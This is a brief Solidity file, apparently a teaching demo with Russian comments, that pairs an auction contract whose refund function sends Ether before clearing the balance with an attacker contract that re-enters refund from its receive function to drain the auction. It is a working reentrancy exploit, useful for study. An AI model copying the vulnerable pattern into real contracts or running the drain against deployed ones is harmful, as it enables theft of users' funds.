// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract AuctionRe {
    mapping(address => uint) public bidders;

    function bid() external payable {
        bidders[msg.sender] += msg.value;
    }

    function refund() external { //функция возврата ставок
        address bidder = msg.sender;

        if(bidders[bidder] > 0) {
            (bool success, ) = bidder.call{value: bidders[bidder]}("");
            require(success, "failed");
            bidders[bidder] = 0;
        }
    }

    function currentBalance() external view returns(uint) {
        return address(this).balance;
    }
}

contract AttackRe {
    uint constant SUM = 1 ether; // наша ставка всегда будет равна 1 eth
    AuctionRe auction;


    constructor(address _auction) { //принимаем адрес аукциона для взлома
        auction = AuctionRe(_auction);
    }

    function doBid() external payable { //функция, чтобы сделать ставку
        auction.bid{value: SUM}();
    }

    function attack() external {
        auction.refund();
    }

    receive() external payable {
        if(auction.currentBalance() >= SUM) {
            auction.refund();
        }  
    }
}